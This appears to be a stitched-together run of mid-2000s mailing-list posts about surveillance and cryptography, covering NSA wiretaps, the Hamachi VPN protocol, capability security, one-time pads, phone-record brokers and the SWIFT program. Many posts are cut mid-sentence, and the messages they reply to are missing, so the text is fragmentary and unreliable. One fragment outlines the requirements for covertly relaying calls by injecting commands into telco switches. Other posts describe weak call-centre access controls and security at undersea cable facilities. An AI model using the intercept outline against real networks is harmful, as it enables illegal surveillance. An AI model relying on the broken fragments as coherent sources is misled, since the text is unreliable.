to avoid Congressional investigation of the NSA's warrantless
surveillance of American citizens.
Although key leaders remain angry at the White House for not seeking
Congressional approval for the NSA wiretap program, debate over
surveillance has been sidelined. Leaders from both parties are lining
up behind proposals to bleach the stain of illegality from warrantless
wiretaps--either by incorporating warrantless eavesdropping into the
Foreign Intelligence Surveillance Act or by simply declaring
warrantless taps legal. Lost is the simple fact that both plans
broaden domestic spying far beyond the Patriot Act and make hash of
the venerable constitutional demand for search warrants.
That Guantanamo and NSA spying on citizens--the Administration's
abuses abroad and at home--are part of the same fabric of illegality
was brought home by a February 14 House national security subcommittee
hearing. Led by Christopher Shays and Henry Waxman, the subcommittee
heard firsthand evidence of what becomes of truth-tellers in the Bush
military and intelligence services.
In this sense Mora was lucky: He was merely blocked at every turn. He
wasn't demoted like Specialist Samuel Provance, who was kicked
downstairs after confronting a general with horrifying details about
interrogations at Abu Ghraib. Mora wasn't declared by his bosses to be
mentally ill, like NSA whistleblower Russell Tice--who indicated to
the subcommittee that the agency's illegal "black ops" extend well
beyond the wiretap program. No one spread false rumors about Mora's
sex life, as the Defense Intelligence Agency did about Lieut. Col.
Anthony Shaffer after he revealed the extent of the government's
pre-9/11 knowledge about Mohamed Atta (gained through the "Able
Danger" data-mining program).
The dark arts of trashing whistleblowers, who are supposedly protected
by federal law, add yet another layer of illegality to the "war on
terror." Still, Congress and the courts dodge their responsibilities
while the White House maintains its right to stand above the law--and
torture, imprisonment without trial and warrantless spying on
Americans go on, and on.

The description on a page was not updated properly. Recent clients
use per-direction keys after they complete P2P KE.
Crypto suite is essentially just a protocol number. It requires
no authentication. If the server side responds with HELO.OK, it
means that it can comprehend specified protocol revision. Similar
to what happens during the SSH handshake.
It is not.
A protection against what kind of attack ?
Identity is used to specify which public key the client wants
to be authenticated with on the server side. Assuming it is
swapped in transition by a man in the middle, it would still
require an attacker to re-sign authentication hash in the
Assuming he has a private key to do that, he will effectively
succeed in authenticating under substituted ID. He then will
need to re-sign server's auth hash to complete the attack,
which is not going to happen.
There is an off chance that the attacker might swapped the
identity to one that has the same public key. The chances
of this happening are infinitely small unless an attacker
also has an access to victim's keypair, which becomes a
trivial attack case.
If you are referring to HMAC-SHA1 for authentication hashes, it
is a part of a crypto suite (protocol revision) spec.
This is the second revision of Hamachi system. First revision
was using SSL for cli-srv and IKE/ESP for p2p security. It was
a prototype and it soon become obvious that both SSL and IKE
were overkills for our purposes. We did not need certificate
authentication of SSL, we did not want to run our own auth
protocol over SSL/AnonDH, which would've increased the number
of packets per login sequence. We didn't need the flexibility
(ie complexity) of IKE either.
After stripping down IKE (ie removing SA negotiation, reworking
ID payloads and not doing quick mode), we essentially ended up
with a protocol that was also fit for securing cli-srv session.
It was further tweaked and replaced SSL.
I should probably add that I implemented IKE (v1) keying daemon
from scratch with all bells and wistles (NATT, extended MODP
groups, etc) at some point in the past. Some remnants of it
are still floating around, the library name was libike.
Yes, it is. This is why I like it.

In SSL, the lack of authentication of the cryptosuite could be used to
convince a v3 client that it is communicating with a v2 server, and
the v3 server that it is communicating with a v2 client, causing them
to communicate using SSL v2, which is called the "version rollback
attack".  This is not relevant to the hamachi protocol because there
is no negotiation.  Nevertheless, authenticating the previous
plaintext fields once a secure channel is established is considered
good form.
In Schneier's "Practical Cryptography", he suggests computing the MAC
over the entire history of sent messages, which ensures that any
tampering is detected at the next MAC.  This is eventually what was
done in SSLv3, for reasons Tero alluded to and which are successfully
thwarted for the reasons you describe.
I sort of wonder at the utility of a TCP implementation of the p2p
VPN... tunnelling TCP over TCP is well known to be a Bad Thing with
regard to interaction of the TCP timeouts.
Aside:  Can anyone tell me why the constants used in ipad and opad for
HMAC were chosen?  If they're not arbitrary, I'd like to know the
rationale behind them.

Nonces and DH exponents are serialized using PER-style ASN.1 encoding.
So the whole concatenation is unambigious.
Just to be clear, Hamachi tunnels VPN/P2P traffic over UDP. TCP is
used for client-server session only.
VPN over TCP is bad for two reasons. One you listed, and another
is that it becomes trivial to DoS this kind of VPN. TCP packets
are not authenticated (unless MD5/BGP extension is used, which
is unlikely), so the state of VPN transport layer and consequently
the state of a tunnel can be altered by 3rd party.
That's why SSL VPNs make very little sense in non-proxied setups
and that's why (I'd guess) OpenVPN 'tweaked' SSL to run over UDP

When you get mired into threat models involving well fundend
adversaries using exotic interdiscplinary vulnerability assesment and
exploitation the definition of "secure domain" becomes extremely
verbose and difficult (some would argue effectively impossible for
anyone but large TLA's) given the amount of context required to state

in depth.

, Capability Talk My main point is  below.  Please skip down to that if reading time
is limited.
  While I agree with the difficulties in preventing covert
communication, I don't more generally agree with "Don't forbid what
you can't prevent", at least in this instance.  If confinement is a
natural effect of tokenized permission transfers (e.g. via
capabilities) where capabilities to objects are bundled with the
permission to communicate to the server of whatever object the
capability grants access to, then it seems quite natural and
effective to include that permission to communicate along with the
permission to access the object.  It may well be that communication
is possible in any case (e.g. via a covert channel), but by bundling
it explicitly with a permission to access an object it makes other
communication outside that explicitly granted only possible by
extraordinary means such as covert channels - which are available in
any case.  In my opinion it's preferable to explicitly limit such
communication rather than simply give up in the face of covert
channels and open all communication.
I admit that I do find it amusing finding myself on this side of this
argument in that the network operating system that I designed and
implemented through much of the 1980s (NLTSS, e.g.:
) took the opposite position on this issue - arguing that the
'natural' condition of processes is to be able to freely communicate
on a general network and that only object access (not the
right/permission to communicate) should be limited by capability
transfers.  At some point I came to accept that I was wrong in taking
that approach, I think mostly as a result of dealing with so many
situations where limiting communication (e.g. with firewalls) can
indeed be useful, even accepting the potential presence of covert
channels.  I generally feel that covert channels are more of a
theoretical than a practical threat, except in cases of dealing with
quite sensitive information like classified information or sensitive
intellectual property or business information.
  I won't explicitly address the above means to prevent covert
channels except to say that given the history of analysis of covert
channels I'm somewhat skeptical of such efforts.
One thing I think it's important to keep clear is that the mechanisms
that have generally been discussed for covert channels require
cooperation on both ends of the channel.  No mechanisms that I'm
aware of have been demonstrated which 'force' communication from one
process into another unwilling recipient (e.g. to access an object
without explicit permission).
  My main reason for writing is to dispute this statement:
I hope in the above you are meaning that capabilities are useless too
 vs. being
useless in general.  Of course the primary use for capabilities is in
explicitly transferring permissions between processes (subjects,
active objects, domains, whatever you choose to call active computing
entities).  One such permission is the permission to communicate
which, in the strongest capability systems, always explicitly
accompanies any transferred capability.  That is, when a capability
is transmitted from one process to another the permissions of the
capability include the authority to communicate to whatever service
provides the explicit permissions granted by the capability.  For
example, a capability to a file includes permission to communicate to
the appropriate file server.  However, most permissions explicitly
transferred by capabilities are some form of object access beyond the
authority to communicate to the object server.
While it's true that in the face of covert channels the value of
transferring a permission to communicate via a capability (e.g. as
above the permission to communicate to a file server) may be somewhat
constrained (the process and the file server may be able to
communicate in any case via a covert channel), the primary value of
the capability in transferring permissions (in the example the
permission to access a file, which is not compromised by the presence
of covert channels) is still present.
Providing confinement in the face of covert channels is indeed a
difficult problem.  However, I think it's important not to suggest
that capability tokenized transfers of permissions have no value
simply because one permission, the permission to communicate, is
difficult to control (with or without capabilities).  Most
permissions are not so difficult to control and can be perfectly
adequately managed with capabilities.  I'm not alone in arguing that
tokenizing permissions via capabilities provides many advantages over
conveying permissions by other means such as access lists or ambient
authority mechanisms (e.g. users/groups and permission
bits/configurations for users/groups).  These values of capability
transfers are not rendered useless simply because covert channels
limit the ability of capabilities to also manage the permission to communicate.
You (Constantine Plotnikov) may be arguing that a capability
infrastructure can't prevent a process from communicating permissions
via covert channels (e.g. by proxy).  This is true just as one can't
prevent data from being communicated via covert channels.  However,
this is again only dealing with the potential confinement value in
capabilities as distinct from what I see as their primary value in
providing for transfer of permissions for object access.  Covert
channels can thwart efforts at confinement, but they cannot thwart
efforts to limit object access to those processes which have been
explicitly granted access - even if via a covert channel through a proxy means.

steal data off the pages you use to communicate over InfoCard secured
sessions back to your bank. (see the Haxdoor rootkit as an example of
That aside, what is this InfoCard? Well, that's not spelt out in so
many words as yet:
In the client user interface, each of the user's digital identities
used within the metasystem is represented by a visual "Information
Card" (a.k.a. "InfoCard", the source of this technology's codename).
The user selects identities represented by InfoCards to authenticate
to participating services. The cards themselves represent references
to identity providers that are contacted to produce the needed claim
data for an identity when requested, rather than claims data stored on
the local machine. Only the claim values actually requested by the
relying party are released, rather than all claims that the identity
possesses (see Law 2).
... Now we come to the user-centric part of the InfoCard system:
2.7. Authenticating Users to Sites InfoCards have several key
advantages over username/password credentials:
    * Because no password is typed or sent, by definition, your
password can not be stolen or forgotten.
    * Because authentication is based on unique keys generated for
every InfoCard/site pair (unless using a card explicitly designed to
enable cross-site collaboration), the keys known by one site are
useless for authentication at another, even for the same InfoCard.
    * Because InfoCards will resupply claim values (for example, name,
address, and e-mail address) to relying parties that the user had
previously furnished them to, relying parties do not need to store
this data between sessions. Retaining less data means that sites have
fewer vulnerabilities. (See Law 2.)
What does that mean? Although it wasn't mentioned there, it turns out
that there are two possibilities: Client side key generation and
relationship tracking, as well as "provider generated InfoCards"
written up elsewhere:
    Under the company's plan, computer users would create some cards
for themselves, entering information for logging into Web sites. Other
cards would be distributed by identity providers -- such as banks or
governmental agencies or online services -- for secure online
authentication of a person's identity.
    To log in to a site, computer users would open the InfoCard
program directly, or using Microsoft's Internet Explorer browser, and
then click on the card that matches the level of information required
by the site. The InfoCard program would then retrieve the necessary
credentials from the identity provider, in the form of a secure
digital token. The InfoCard program would then transmit the digital
token to the site to authenticate the person's identity.
Obviously the remote provision of InfoCards will depend on buy-in,
which is a difficult pill to follow as that means trusting Microsoft
in oh so many ways - something they haven't really got to grips with.
But then there are also client-generated tokens. Are they useful?
If they have client-side key generation and relationship caching, then
these are two of the missing links in building a sustainable secure
system. See my emphasis further above for a hint on relationship
tracking and see Kim Cameron's blogfor this comment: "Cameron: A
self-issued one you create yourself." Nyms (as per SSH and SOX) and
relationship tracking (again SSH, and these days Trustbar,Petname and
recent other suggestions) are strong. These ideas have been around for
a decade or more, we call it opportunistic cryptography as a school.
Alternatively, notice how the credentials term is slipped in there.
That's not how Stefan Brands envisages it (from Identity on the move I
- Stefan Brands on user-centric identity management), but they are
using his term. What that means is unclear (and see Identity on the
move III - some ramblings on "we'll get it right this time, honest
injun!" for more).
Finally, one last snippet:
3.6. Claims != "Trust" A design decision was to factor out trust
decisions and not bundle them into the identity metasystem protocols
and payloads. Unlike the X.509 PKIX [IETF 05], for example, the
metasystem design verifies the cryptography but leaves trust analysis
for a higher layer that runs on top of the identity metasystem.
Hallelujah! Trust is something users do. Crypto systems do claims
about relationships.

yeah, follow tcp stream in ethereal is a good example of how trivial
it is to recreate a session of communication given an archive of its
component datagrams.
right.  hence my fetish for one time pads for key exchange and
previous comment about quantum computers / fast GNFS / etc.  they are
up to 8 qubits, only a few thousand more to go.  ;)
this is particular to the method TD mentioned i think...
i am assuming the following:
- the operating system is installed on a loop-aes volume so that
integrity of the kernel, libraries and utilities is protected via
- the one time pads are stored encrypted in a similar manner so that
access to them requires external keys (like the gpg encrypted keys
used for loop-aes volumes)
- the passphrase used to authenticate a user for access to the pads is
coupled with external storage (usb) of the keys used to access the
to recover the plaintext communication from the encrypted datagrams
the attacker would need to obtain the encrypted pad, the keys on
external storage (usb), and the passphrase to access the keys.
this doesn't provide time destruction so i assume this is in reference
to Tyler's description.  you could couple the user authentication with
a physically hardened token of some sort for access to the pads but
even this would require manual destruction.
do they make physically hardened authentication tokens with timed self
destruction built in?

underwent significant physical security and facility upgrades in
recent years.  back when critical infrastructure details were
carefreely public the termination faclities a few hundred yards from
the shore even carried a promiscuous "FIBER OPTIC" sign on the door.
(the oregon fishermans undersea cable group used to provide the cable
plots with GPS coordinates a few score miles out as well.  now you
have to request these from them directly so they can limit
distribution to local area fishermen and others with a legitimate need
for the information)
initial reaction to security concerns included building a large razor
wire chain link fence around the facilities, although it appears this
was too much of an attention getter as they removed all such imposing
fencing before long and have continued to rely on extensive
cameras/alarms/highly visible boundary around the now rebuilt
facilities (aprox. 3-4 times the size of the original structure).
could more capturing equipment on site be the reason behind the
significant facilities upgrade?  they don't like to give tours of such
places unfortunately... :)
the main peering facilities located in hillsboro for the WCI cable
have not undergone any similar upgrades although the building was
already large and well secured from the start.

also, it was my understanding that El Al uses armed personel on

deterrent to use instead of passenger personality.

it seems like this should be possible using a radioactive material
with a known short half-life and exposing it to a neutron source with
a mask (beryllium?) with the key space on it.
assume a grid of cells on a flat surface containing the radioactive
material; if a given cell emits over a threshold of radiation it is a
'1' bit, dead it is a 0 bit.  exposing the 0's to a neutron emitter
would fission the radioactive cells early leaving it's ionizing
radiation level below the threshold.
there would be some delay between when the key was usable with all
cells/bits readable (a few days, weeks, months?) and when it was still
holding a detectable / useful amount of key information that could be
used in a brute force attack against the unknown bits of key.
they let you put americium in smoke detectors but something tells me
it would be hard to get radioactive crypto keys commercially approved
for production. :)

18 USC 2702(c) says
        A provider described in subsection (a) may divulge a record or

        covered by subsection (a)(1) or (a)(2)) ...

If the phone companies are not giving it out voluntarily, perhaps
they're being tricked or perhaps they have corrupt employees.
from the article:
""In some cases, telephone company insiders secretly sell customers'
phone-call lists to online brokers, despite strict telephone company
rules against such deals, according to Schumer.""
the call center employees and other data services API's (less common)
is exactly how they do it.  t-mobile, verizon, sprint, they all
contract out to call centers for various things which provide the call
center operators a restricted environment in which to use their
internal applications (usually IE, sometimes Remedy or Oracle Forms,
graphical Java apps, etc).
obviously part of the features of these applications is search by
name, MIN, account, etc.  often you can access a person's entire
account through such systems and very little if any oversight is
provided.  the carriers sole focus (as it seems) is to prevent
fraudulent equipment/phone deliveries to operators using customer
accounts.  they could care less about unauthorized access given their
lack of any attempt to halt such activity.
in addition to this, many of these internal networks are horribly
insecure, as was well demonstrated by the t-mobile hacks earlier this
year. [1]
the only reason they continue to get away with such poor practice is
that these networks are (in theory) all internal with dedicated lines
from the call center back to the carrier networks on which the
applications are run. and the fallout from their insecurity is not
directly attributable back to them (they can and do blame various
middle men, from devious operators to negligent call center policies,

Researchers Develop Quantum Processor By Jay Wrolstad
January 12, 2006 11:57AM
A computer chip based on the esoteric science of quantum mechanics has
been created by researchers at the University of Michigan. The chip
might well pave the way for a new generation of supercomputers.
Employing the same semiconductor-fabrication techniques used to create
common computer chips, the Michigan team was able to trap a single
atom within an integrated chip and control it using electrical
Electrically charged atoms (ions) for such quantum computers are
stored in traps in order to isolate the qubits, a process that is
essential for the system to work.
The challenge is that current ion traps can hold only a few atoms, or
qubits, and are not easily scaled, making it difficult to create a
quantum chip that can store thousands or more atomic ions. A string of
such atoms, in theory, could store thousands of bits of information.
In the chip created at Michigan, which is the size of a postage stamp,
the ion is confined in a trap while electric fields are applied. Laser
light puts a spin on the ion's free electron, enabling it to flip it
between the one or zero quantum states.
The spin of the electron dictates the value of the qubit. For example,
an up-spin can represent a one, or a down-spin can represent a zero --
or the qubit can occupy both states simultaneously.
Applications for Cryptography
The quantum processor is made of gallium arsenide in a layered
structure and etched with electrodes using the same type of
lithography process as those used to create today's computer chips.
Each electrode is connected to a separate voltage supply, and these
various electrical voltages control the ion by moving as it hovers in
a space carved out of the chip.
The next step is to build a bigger chip with many more electrodes, so
that it can store more ions. There still is a lot of work to be done
to learn how to control lots of ions in one of these chips. It won't
be nearly as easy as it was with conventional computer chips, but at
least we know what to do in principle, Monroe said.
"This type of integrated chip structure is significant because it
demonstrates a way to scale the quantum computer to bigger systems,"
Monroe said. "It has applications for processing very large [data
sets] such as in cryptography, for example, and there is a lot of
interest in this by the government."

  While it is always fun to call the government stupid, or anyone else for
that matter, there is a little more to the story.
  - For one you do not need a backhoe to cut fiber
  - Two, fiber carries a lot more than Internet traffic - cell phone, 911,
financial tranactions, etc. etc.
  - Three, while it is very unlikely terrorists would only attack telecom
infrastructure, a case can be made for a telecom attack that amplifies a
primary conventional attack.  The loss of communications would complicate
things quite a bit.
  I'll agree it is very far fethced you could hatch an attack plan from FCC
outage reports, but I would not call worrying about attacks on
telecommunications infrastructure stupid.  Enough sobriety though, please

the solution (at least, the only effective solution aside from
significant infrastructure redundancy - $$$) is rapid repair, and
att's disaster recovery program works well in this regard.  if you
recall after the trade center attacks (taking out massive CO capacity)
they used a fleet of mobile switching trailers to terminate and switch
all of the damaged fiber.
this type of disaster recovery is also expensive, but much less than
buried infrastructure and fixed COs.
in my experience severely congested packet networks are just as shitty
as outages in general; what good is that broadband line when your path
to the world is constrained at 14.4? :P
the real problem is the lack of diversity at the physical "X fibers
through same conduit / RoW" layer that forces a single point of
failure.  the telco idea of path diversity is one ring buried plant
and the other ring aerial plant along the same right of way... doesn't take much for a clustered outage in this environment to
disrupt packet/cell based networks as much as dedicated circuits.
in this respect the DHS paranoia over bridge photography begins to
make a little more sense (although still useless).

agreed; it would be interesting to debate the bare minimum
requirements for a system where pads would provide a useful
improvement in security.  this means all those other holes bidding
malicious peers welcome need to be closed.
note that unless you have a hardware entropy source generating
anything more than a small amount of truly random pad is going to take
a lonnnnng time.
the yarrow based /dev/random in bsd is a fucking cop out; they should
remove it (that is what /dev/urandom is for).
fortunately VIA, AMD and Intel all provide hw rng sources of varying
capability on commodity systems.
this is why i like pads for key distribution.  with key material pre
distributed between the endpoints that will consume it you can
restrict network communication so that only authenticated traffic
(from peers whom you have exchanged pads with) is allowed into higher
levels of the OS stack / forwarded / applications.
this is really where i see a justifiable security improvement - block
all unauthenticated traffic up front, no open ports, no complex public
key formats / negotiation. (it would also be interesting to see all of
the potential remote exploit vulnerabilities in common IPsec key
in this scenario you can still transfer your huge data archives around
without consuming the entire pad with a quickness; frequent IPsec key
exchange to refresh SA's leverage the security and simplicity of pads
while retaining the flexibility of a chained block cipher for bulk
strong authentication and endpoint security are one of these critical
components required to use a pad effectively.  at a minimum i've
settled on the following for managing key material and endpoint
- bootstrap with read-only disc media prepared by a trusted peer. boot takes about 8-12 seconds for key management mode on a 1Ghz VIA
- passphrase protected full disk encryption with loop-AES
- loop-AES key schedule on USB memory stick [two factor auth]
- distinct domains / runtime instances for specific purposes.  as an
example, key management mode (import / export of keys, generation of
pads, creation/modification of digital identity) does not even support
any network capabilities in the statically linked kernel.  all
interaction in this domain is performed via file system with keys
manually copied to external domains which are network aware or hosting
this does mean that you're stuck using linux/bsd* for a secure domain,
with grsec/lsm/selinux/pax style defenses highly suggested.  ideally a
capability operating system would be used, but this is a challenging
yes! fixed buffer sizes, small attack surface, authentication from the
first packet onward (rather than entering into a negotiation to
ascertain identity).
best regards,
* both of these kernels need a good audit before they can be trusted
(at least pertaining to the code exposed to unauthenticated attackers
at a minimum), as do_brk() and bsd beacon overflows in ring0

moved in close-knit groups, rounding a stranger or a rival group
conspicuously, the way cats do. They spoke in whispers. They glanced
nervously over their shoulders as they took calls on their cell

They were government officials, telephone company honchos, military
officers, three-letter-agency spooks and cops, all brought together by
salesmen dealing in the modern equipment of surveillance. It was my
job to learn what they were up to.
They'd gathered for the ISS World Conference, a trade show featuring
the latest in mass communications intercept gear, held in the
Washington, D.C., suburb of Crystal City, Virginia. Situated
conveniently between Reagan National Airport and the Pentagon, Crystal
City is an artificial place dominated by conference centers and

contractors, lobbyists, consultants and trainers. They rotate in and
out, civilians using the airport, military personnel taking the subway
from the Pentagon, with Crystal City as the intersection in a
figure-eight circuit of constant activity.
Back in the narrow hotel corridor, vendors manned their booths,
exhibiting the latest gadgets for mass electronic surveillance:
machines capable of scouring the data streams of millions of
subscribers -- industrial-strength kits for packet interception and
analysis, RF interception, and voice and keyword recognition.

trying to get some feedback for working documentation / design before
our next published iteration expected on july 4th.
please feel free to provide public comments or suggest related
projects/research/code to me directly or on list.
throwing down the gauntlet:
using various authentication and key management methods at the TCP
session level associated with a specific IP/port endpoint pair for
access to network services[1][2][3][4][5]* is a relic from decades
past and is not only inefficient and inflexible but actively
detrimental to good usable security due to the baggage and complexity
inherent in these methods.[6][7][8]
access to network services should be provided on top of a network
endpoint local to the two domains requesting and providing services
respectively, with user centric authentication for initialization of
the secure IPv4/IPv6 tunnel session to which services are bound and
revocation performed by terminating this session and the ability to
reestablish it.
revocable delegation is implemented by proxy of traffic between peers
to the delegated domain and irrevocable delegation implemented by
sharing authentication credentials for the desired endpoint service(s)
with the trusted peer for direct communication without proxy.
* i listed three distributed capability based protocols not as a
slight, but to point out that a capability / POLA / least privilege
approach to building and providing services at the OS and application
layers is the only way truly good security can be realized.  i would
like to see the implementation / protocol specific parts of
communication privacy pulled out of such projects so they can focus on
and implement what they are designed for and most effective at. this
is a long term vision as the effort to transition to wide scale
capability based security is significant.[9]
in a sense this is simply a way to exchange "the capability to
communicate with me privately" and then utilize the services made
available to your peers when this capability is exercised.
Q: why delegate authentication and privacy to a network IPv4/IPv6
endpoint layer?
- this allows a flexible and intuitive method for implementing privacy
and authentication of digital communication between peers.  the
existing tools and concepts associated with Virtual Private Networks
can be employed in a decentralized and user centric manner while
existing applications and services can use the strong authentication
and session management available by binding to the desired endpoint
"sharing the authentication and privacy bootstrap" makes sense for
everyone. more reasons?
- it allows you to limit any unauthenticated attacks against
application / private services to the VPN layer itself (OpenVPN port,
IPsec stack, etc), thus keeping applications more vulnerable to attack
(rich web services, new apps, etc) inside an authenticated boundary.
NOTE: this should not be interpreted as the usual "perimeter security"
model which is flawed.  when each peer communicates directly you have
effectively deperimeterized the hosts on the network.
- it meshes well with a virtual machine approach to isolating domains
where each VM instance can have it's own network endpoint tied to
distinct authenticated sessions.
- it allows pet names to be given to distinct addresses bound to peer
identity (using the SHA2-256 digest of peer public key to generate a
feed::/8 address for example, which can be given a petname[10] in
public.peertech.org or 172.16.27.53 devwiki)
- traffic shaping, bandwidth monitoring, IDS and other techniques can
be applied to distinct authenticated sessions using the desired IP
address in a straightforward manner.  this can be particularly
difficult to do when an application uses ephemeral / dynamic ports but
is simple with distinct endpoints.
Q: what about passwords?
- it is assumed that this style of security would utilize full disk
encryption or a key manager (like the browser site login remember
feature) to manage strong authentication material associated with a
user's identity.  passwords are too weak for good network
Q: what would the key distribution for this kind of identity
management look like?
- some examples:
A. Strongly authenticated propinquitous capability exchange:
  First two peers exchange public keys (self signed OpenVPN
certificates) and endpoint locators in person.
  Second they both connect over wireless / LAN directly using OpenVPN
to establish an authenticated and private network between them.
B. Strongly authenticated transitive introduction:
  Using a secure session pair created via strong auth, send the public
key of each peer to be introduced to each other.
  Each peer attempts directly connecting using the endpoint
identifiers for each other obtained from the mutually trusted peer.
C. Opportunistically authenticated capability exchange:
  Petition public / untrusted introducer with nickname or other
identifier for endpoint discovery (coderman.dyndns.org for example).
  Connect to peer and exchange and save keys (openssh style).
  Keys may be verified in the future or reset if problems are encountered.
Q: This sounds way too complicated; what can support this kind of connectivity:
- while difficult this is feasible and straightforward.  existing
tools like OpenVPN, OpenSSH 3.4+, IPsec, PPTP, and others can all be
integrated in a suitable fashion using everything from UDP, TCP to
ICMP and even covert DNS tunnels or 802.11 injection for transport.
the key will be making key management and user interaction simple
enough for the appropriate threat models.

"Fail-Safe Techniques Erase Magnetic Storage Media"
"This is a very challenging problem," said Michael Knotts, a research
scientist in the GTRI's Signature Technology Laboratory. "We had to
verify that the data would be beyond all possible recovery even with
unlimited budget and unlimited time. Commercial devices on the market
for data erasure just couldn't fill the bill, because they were
magnetically too weak, they were physically too large and heavy, or
they didn't meet stringent air safety standards."
Producing a magnetic field sufficient to destroy data patterns
required the use of neodymium iron-boron magnets custom-designed for
the project and special pole pieces made of esoteric cobalt alloys.
The magnets, which weigh as much as 125 pounds, had to produce fields
sufficient to penetrate metallic housings that surround some drives.
"We developed models for magnetic circuits that we could run through
optimization codes to design the best shape to get the field that we
needed," Knotts said. "It takes quite a magnetic field to get through
the steel enclosures on some of the drives. We are producing magnetic
fields comparable to those used in magnetic resonance imaging
equipment, so these are not your ordinary refrigerator magnets."
"This was certainly an unusual project," he said. "It's not often that
we get paid to crush equipment in presses, blow things up and set off
fires in microwave ovens."
i occasionally use one of those noisy AC powered degauss'ers on hard
disks but have wondered if it would pass the "unlimited budget and
unlimited time" test.  i wonder what it would take to restrain a disk
through an MRI machine without it impaling itself into the coils...
(some of those horror stories are pretty wild)
initializing a disk with entropy afterwards is also annoyingly time
consuming for big disks.  i'm concerned about just how usable you can
make this process, perhaps turning it into a background batch process
requiring multiple disks so one can be used for the live system while
an empty disk is being wiped and randomized.

here's lots of news today about the (not particularly surprising)
revelations that AT&T may have helped monitor internet traffic for the
NSA. It's interesting to note, with this news, the side story that
AT&T also just revamped their privacy policy, allowing them to more
freely share whatever data they collect with government officials.
However, rather than discuss those two issues (which are being
discussed widely), a more interesting question is whether or not this,
along with the ongoing debates around net neutrality, will actually
lead more people to simply encrypt their internet traffic. It
certainly could open up quite the business opportunity for firms
providing encrypted VPN systems that basically scramble all your data
so your ISP can't snoop and can't prioritize (or downgrade) the
poor chumps who buy the proprietary snake oil; true security requires
visibility, and alas there's not a big market for decentralized open

Bank Data Sifted in Secret by U.S. to Block Terror
By ERIC LICHTBLAU and JAMES RISEN
WASHINGTON, June 22  Under a secret Bush administration program
initiated weeks after the Sept. 11 attacks, counterterrorism officials
have gained access to financial records from a vast international
database and examined banking transactions involving thousands of
Americans and others in the United States, according to government and
industry officials.
The program is limited, government officials say, to tracing
transactions of people suspected of having ties to Al Qaeda by
reviewing records from the nerve center of the global banking
industry, a Belgian cooperative that routes about $6 trillion daily
between banks, brokerages, stock exchanges and other institutions. The
records mostly involve wire transfers and other methods of moving
money overseas and into and out of the United States. Most routine
financial transactions confined to this country are not in the
"The capability here is awesome or, depending on where you're sitting,
troubling," said one former senior counterterrorism official who
considers the program valuable. While tight controls are in place, the
official added, "the potential for abuse is enormous."
Officials described the Swift program as the biggest and most
far-reaching of several secret efforts to trace terrorist financing.
Much more limited agreements with other companies have provided access
to A.T.M. transactions, credit card purchases and Western Union wire
payments, the officials said.
Treasury officials said Swift was exempt from American laws
restricting government access to private financial records because the
cooperative was considered a messaging service, not a bank or
financial institution. [ED: heheh]
Several people familiar with the Swift program said they believed that
they were exploiting a "gray area" in the law and that a case could be
made for restricting the government's access to the records on Fourth
Amendment and statutory grounds.
In terrorism prosecutions, intelligence officials have been careful to
"sanitize," or hide the origins of evidence collected through the
program to keep it secret, officials said.
Quietly, counterterrorism officials sought to expand the information
they were getting from financial institutions. Treasury officials, for
instance, spoke with credit card companies about devising an alert if
someone tried to buy fertilizer and timing devices that could be used
for a bomb, but they were told the idea was not logistically possible,
a lawyer in the discussions said.
Intelligence officials were so eager to use the Swift data that they
discussed having the C.I.A. covertly gain access to the system,
several officials involved in the talks said. But Treasury officials
resisted, the officials said, and favored going to Swift directly.
[ED: wow, that would have been fun. crash an international banking
network by accident? oops!]
Within weeks of 9/11, Swift began turning over records that allowed
American analysts to look for evidence of terrorist financing.
Initially, there appear to have been few formal limits on the
"At first, they got everything  the entire Swift database," one
person close to the operation said.
Officials realized the potential for abuse, and narrowed the program's
targets and put in more safeguards. Among them were the auditing firm,
an electronic record of every search and a requirement that analysts
involved in the operation document the intelligence that justified
each data search. Mr. Levey said the program was used only to examine
records of individuals or entities, not for broader data searches.
Despite the controls, Swift executives became increasingly worried
about their secret involvement with the American government, the
officials said. By 2003, the cooperative's officials were discussing
pulling out because of their concerns about legal and financial risks
if the program were revealed, one government official said.
"How long can this go on?" a Swift executive asked, according to the official.
Even some American officials began to question the open-ended
arrangement. "I thought there was a limited shelf life and that this
was going to go away," the former senior official said.

this is that you tie up significant switch resources (a "conference
resource" or other such name, in addition to the outbound spans
required for covert relay to destination).  the problems with text

process working with the legitimate soft switch programs on a unix
host) but could be done at a network level (process monitoring and
injecting call process commands directly to switch hardware at a low
level - harder to do, but can be more stealthy)
- one technician who can supply the current switch configuration
(spans from towers / carriers, their signalling characteristics, etc)
- telco test configuration (a softswitch configuration as close to
target configuration as possible, a tsunami or other bulk call
generator / call test harness)
- time and money.

interest, bridge to available one way conference, connect conference

But you don't have to reveal that you sent him email.  You can use
stealthy communication.
Stealthy communication is communication wherein not only is the
content concealed from eavesdroppers by encryption, but information
about who is communicating with whom, when, or if at all, is
concealed, as well.
The Internet can be used for stealthy communication.  The basic idea
is that each potential participant has ongoing traffic to and from a
message pool which is propagated world-wide.  When the participant has
no live traffic to send, dummy traffic is sent instead.  The dummy
traffic is indistinguishable from the live traffic except by using
decryption keys which are chosen by correspondents.  The outbound
traffic continues autonomously without interruption for months and
years and is not correlated to the live traffic, so an observer
without the keys cannot determine when or how much live communication
is happening.  Inbound cover traffic consists of taking a full feed of
the message pool at all times without interruption.
A Debian Linux package exists which enables stealthy email.  It has
been in everyday use for years, although not widely.  Details on
request.  I am looking for someone to host it.  Any volunteers?

'Torture Boy' Signals More Spying
By Robert Parry
March 2, 2006
Correcting misleading testimony to Congress, Attorney General Alberto
Gonzales has signaled that George W. Bush's warrantless surveillance
of Americans went beyond the known eavesdropping on communications to
suspected terrorists overseas.
In a letter to the Senate Judiciary Committee on Feb. 28, Gonzales
recanted testimony he gave on Feb. 6 when he declared that Bush had
only authorized a narrowly constructed warrantless wiretapping program
by the National Security Agency against Americans in touch with
foreign terror suspects.
Referring to a part of his testimony in which he said Bush had
approved the NSA program "and that is all that he has authorized,"
Gonzales withdrew that language, saying "I did not and could not
address  any other classified intelligence activities." [Washington
Post, March 1, 2006]
The strained wording of Gonzales's letter  and the fact that he
deemed it necessary to correct his testimony  suggest that other
warrantless surveillance programs exist outside the framework of the
NSA program, which began shortly after the Sept. 11, 2001, terror
attacks and was exposed by the New York Times in December 2005.
Sen. Arlen Specter of Pennsylvania, the committee's Republican
chairman, didn't put Gonzales under oath at the Feb. 6 hearing, but
false statements to Congress still constitute a potential criminal
Close Questioning
The dubious testimony came during close questioning by Sen. Patrick
Leahy of Vermont, the committee's ranking Democrat. Leahy pressed
Gonzales on the administration's claim that Congress gave Bush the
power to wiretap without a court warrant when it authorized use of
force against al-Qaeda after the Sept. 11 attacks.
